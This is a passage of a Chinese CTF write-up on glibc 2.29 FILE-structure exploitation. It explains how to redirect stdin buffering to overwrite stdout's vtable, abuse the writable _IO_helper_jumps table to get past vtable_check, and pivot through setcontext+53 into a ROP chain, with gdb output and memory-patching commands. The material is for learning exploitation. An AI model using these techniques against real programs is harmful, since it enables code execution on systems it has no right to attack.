        JUMP_FIELD(_IO_doallocate_t, __doallocate);
        JUMP_FIELD(_IO_read_t, __read);
        JUMP_FIELD(_IO_write_t, __write);
        JUMP_FIELD(_IO_seek_t, __seek);
        JUMP_FIELD(_IO_close_t, __close);
        JUMP_FIELD(_IO_stat_t, __stat);
        JUMP_FIELD(_IO_showmanyc_t, __showmanyc);
        JUMP_FIELD(_IO_imbue_t, __imbue);
    };
核心的实现为`_IO_new_file_finish`函数，里面调用了`_IO_default_finish (fp,
0);`，再往后我们不需要再跟了，因为这里我们发现函数的调用方式及参数是固定的，如果我们能控制`vtable`及参数即可劫持执行流。
    void
    _IO_new_file_finish (FILE *fp, int dummy)
    {
      if (_IO_file_is_open (fp))
        {
          _IO_do_flush (fp);
          if (!(fp->_flags & _IO_DELETE_DONT_CLOSE))
        _IO_SYSCLOSE (fp);
        }
      _IO_default_finish (fp, 0);
    }
那么下面就有了俩问题，一是如何控制输入可以覆盖到文件结构体的`vtable`？二是自glibc
2.24后加入了`vtable_check`机制，要如何伪造`vtable`以及改写`vtable`呢？
我们先来看第一个问题。
#### 控制输入
这个题目和`WCTF2016`的一道`wannaheap`非常相似，原题现也已放在`pwnable.tw`，可以参见[FlappyPig](https://www.anquanke.com/post/id/87194)的分析，其大致原理和刚才所说的`stdout`输入相似，即当我们能够控制`_IO_2_1_stdin_`的`_IO_buf_base`以及`_IO_buf_end`字段，我们的输入将落在`_IO_buf_base`到`_IO_buf_end`之间的区域。因此我们用第一次的任意地址写将`_IO_buf_end`改到`value`，之后就可以控制`_IO_buf_base`到`value`之间的所有值，同理如果我们修改`_IO_buf_base`的值为`value`，我们也能控制`val`到`_IO_buf_end`的这块空间。
    gdb-peda$ p _IO_2_1_stdin_
    $9 = {
      file = {
        _flags = 0xfbad208b, 
        _IO_read_ptr = 0x7ffff7f6ba83  "", 
        _IO_read_end = 0x7ffff7f6ba83  "", 
        _IO_read_base = 0x7ffff7f6ba83  "", 
        _IO_write_base = 0x7ffff7f6ba83  "", 
        _IO_write_ptr = 0x7ffff7f6ba83  "", 
        _IO_write_end = 0x7ffff7f6ba83  "", 
        _IO_buf_base = 0x7ffff7f6ba83  "", 
        _IO_buf_end = 0x7ffff7f6ba84  "", 
        _IO_save_base = 0x0, 
        _IO_backup_base = 0x0, 
        _IO_save_end = 0x0, 
        _markers = 0x0, 
        _chain = 0x0, 
        _fileno = 0x0, 
        _flags2 = 0x0, 
        _old_offset = 0xffffffffffffffff, 
        _cur_column = 0x0, 
        _vtable_offset = 0x0, 
        _shortbuf = "", 
        _lock = 0x7ffff7f6e590 , 
        _offset = 0xffffffffffffffff, 
        _codecvt = 0x0, 
        _wide_data = 0x7ffff7f6bae0 , 
        _freeres_list = 0x0, 
        _freeres_buf = 0x0, 
        __pad5 = 0x0, 
        _mode = 0xffffffff, 
        _unused2 = '\000' 
      }, 
      vtable = 0x7ffff7f6d560 
    }
#### 伪造|修改 vtable
在glibc 2.23的`house-of-orange`利用中我们已经有了一套成熟的流程来伪造`vtable`到堆上并在堆上布置函数指针的方式来劫持执行流，但是在glibc
2.24之后由于有`vtable_check`的存在，我们的`vtable`必须要处于`__start___libc_IO_vtables`和
`__start___libc_IO_vtables`之间，因此我们伪造的vtable必须是其原有的`vtable`，这一点在[house of
orange in glibc
2.24](https://xz.aliyun.com/t/2411)解释的很清楚。此外有了`vtable`，最大的难题是按照我们以往经验，在`glibc
2.23`以及`glibc
2.27`其都是不可写的。我们可以找俩vtable分别验证一下，显示确实只读。不过到这里回想下既然都可读，为什么出题人多此一举要再把一些`vtable`改成只读呢，这里其实已经暗示了，`vtable在glibc
2.29是可写的`。这里我们换一个不在这块被修改了权限区域的`vtable`，查看其权限，确实可写。
    /* Check if unknown vtable pointers are permitted; otherwise,
       terminate the process.  */
    void _IO_vtable_check (void) attribute_hidden;
    /* Perform vtable pointer validation.  If validation fails, terminate
       the process.  */
    static inline const struct _IO_jump_t *
    IO_validate_vtable (const struct _IO_jump_t *vtable)
    {
      /* Fast path: The vtable pointer is within the __libc_IO_vtables
         section.  */
      uintptr_t section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;
      uintptr_t ptr = (uintptr_t) vtable;
      uintptr_t offset = ptr - (uintptr_t) __start___libc_IO_vtables;
      if (__glibc_unlikely (offset >= section_length))
        /* The vtable pointer is not in the expected section.  Use the
           slow path, which will terminate the process if necessary.  */
        _IO_vtable_check ();
      return vtable;
    }
    gdb-peda$ p & _IO_file_jumps
    $2 = (const struct _IO_jump_t *) 0x7ffff7dd06e0 
    gdb-peda$ vmmap 0x7ffff7dd06e0
    Start              End                Perm  Name
    0x00007ffff7dcd000 0x00007ffff7dd1000 r--p  /lib/x86_64-linux-gnu/libc-2.23.so
    pwndbg> p & _IO_helper_jumps
    $1 = (const struct _IO_jump_t *) 0x7ffff7b86820 
    pwndbg> vmmap 0x7ffff7b86820
    LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
        0x7ffff7b86000     0x7ffff7b8a000 r--p     4000 1e7000 /lib/x86_64-linux-gnu/libc-2.27.so
    pwndbg>
    gdb-peda$ p & _IO_helper_jumps
    $1 = (const struct _IO_jump_t *) 0x7ffff7f6ca20 
    gdb-peda$ vmmap 0x7ffff7f6ca20
    Start              End                Perm      Name
    0x00007ffff7f6b000 0x00007ffff7f6d000 rw-p      /usr/lib/x86_64-linux-gnu/libc-2.29.so
    gdb-peda$ p  _IO_helper_jumps
    $13 = {
      __dummy = 0x0, 
      __dummy2 = 0x0, 
      __finish = 0x7ffff7e0d600 , 
      __overflow = 0x7ffff7e01250 , 
      __underflow = 0x7ffff7e18140 , 
      __uflow = 0x7ffff7e18150 , 
      __pbackfail = 0x7ffff7e0d430 , 
      __xsputn = 0x7ffff7e0d760 , 
      __xsgetn = 0x7ffff7e0de60 , 
      __seekoff = 0x7ffff7e18ae0 , 
      __seekpos = 0x7ffff7e18800 , 
      __setbuf = 0x7ffff7e186d0 , 
      __sync = 0x7ffff7e18a60 , 
      __doallocate = 0x7ffff7e0da60 , 
      __read = 0x7ffff7e19910 , 
      __write = 0x7ffff7e19920 , 
      __seek = 0x7ffff7e198f0 , 
      __close = 0x7ffff7e18a60 , 
      __stat = 0x7ffff7e19900 , 
      __showmanyc = 0x0, 
      __imbue = 0x0
    }
#### 最终利用思路
这里我们发现自己的思路是可行的，还有一个关键问题是如何寻找合适的`vtable`，这里我的方法就比较无脑了，首先拿`vscode`全局搜索`_IO_jump_t`，找到一个这种类型的变量记录下名称到`gdb`中查看其权限，最后选择`_IO_helper_jumps`这个`vtable`。
所以最后我们的利用链是：
  1. 拿一次任意地址写将`_IO_buf_end`改为`_IO_helper_jumps_addr+0x200`，调试可以发现`stdout`在``_IO_helper_jumps_addr`前面，这样保证都可以覆盖到，至于为什么目标是`stdout`是因为我们fclose的第一个对象是`stdout`
  2. 构造`payload`，覆写`_IO_2_1_stdout_`的`vtable`为`_IO_helper_jumps`，覆写`_IO_helper_jumps`的`__GI__IO_wdefault_finish`为`setcontext+53`，只要我们可以控制`rdx+*`的区域就可以控制其参数
  3. 根据setcontext的参数对应，这里`rcx`是ret之后执行的`rip`，我们设置其为一个`leav;ret`的gadget，在`rbp`设置我们`rop chain`的地址-8，栈迁移之后调用`open/read/write`系统调用，至于`rop chain`，我们把它布置到`main_arena`前一大段零字节区域。
    gdb-peda$ p & setcontext
    $14 = ( *) 0x7ffff7ddce00 
    gdb-peda$ x/32i 0x7ffff7ddce00+53
       0x7ffff7ddce35 :      mov    rsp,QWORD PTR [rdx+0xa0]
       0x7ffff7ddce3c :      mov    rbx,QWORD PTR [rdx+0x80]
       0x7ffff7ddce43 :      mov    rbp,QWORD PTR [rdx+0x78]
       0x7ffff7ddce47 :      mov    r12,QWORD PTR [rdx+0x48]
       0x7ffff7ddce4b :      mov    r13,QWORD PTR [rdx+0x50]
       0x7ffff7ddce4f :      mov    r14,QWORD PTR [rdx+0x58]
       0x7ffff7ddce53 :      mov    r15,QWORD PTR [rdx+0x60]
       0x7ffff7ddce57 :      mov    rcx,QWORD PTR [rdx+0xa8]
       0x7ffff7ddce5e :      push   rcx
       0x7ffff7ddce5f :      mov    rsi,QWORD PTR [rdx+0x70]
       0x7ffff7ddce63 :      mov    rdi,QWORD PTR [rdx+0x68]
       0x7ffff7ddce67 :     mov    rcx,QWORD PTR [rdx+0x98]
       0x7ffff7ddce6e :     mov    r8,QWORD PTR [rdx+0x28]
       0x7ffff7ddce72 :     mov    r9,QWORD PTR [rdx+0x30]
       0x7ffff7ddce76 :     mov    rdx,QWORD PTR [rdx+0x88]
       0x7ffff7ddce7d :     xor    eax,eax
       0x7ffff7ddce7f :     ret
### 调试
上述利用思路3里有一个核心的部分是控制`rdx`，这里有一个简单的方法来迅速验证某些猜想，即在gdb中使用强制修改内存的方式模拟溢出过程，比如这里我们希望查看调用`setcontext+53`时候的情况，使用`set
{long long} 0x7ffff7f6c838 =
0x7ffff7f6ca20`修改stdout的vtable为`_IO_helper_jumps`，使用`set {long long}
0x7ffff7f6ca30 =
0x7ffff7ddce35`修改`_IO_helper_jumps->__finish`为`setcontext+53`，
    gdb-peda$ p & _IO_2_1_stdout_                                                                                                        
    $1 = (struct _IO_FILE_plus *) 0x7ffff7f6c760                                                                        
    gdb-peda$ p _IO_2_1_stdout_                                                                                                          
    $2 = {                                                                                                                               
      file = {                                                                                                                           
        _flags = 0xfbad2887,                                                                                                             
        _IO_read_ptr = 0x7ffff7f6c7e3  "",                                                                          
        _IO_read_end = 0x7ffff7f6c7e3  "",                                                                          
        _IO_read_base = 0x7ffff7f6c7e3  "",                                                                         
        _IO_write_base = 0x7ffff7f6c7e3  "",                                                                        
        _IO_write_ptr = 0x7ffff7f6c7e3  "",                                                                         
        _IO_write_end = 0x7ffff7f6c7e3  "",                                                                         
        _IO_buf_base = 0x7ffff7f6c7e3  "",                                                                          
        _IO_buf_end = 0x7ffff7f6c7e4  "",                                                                           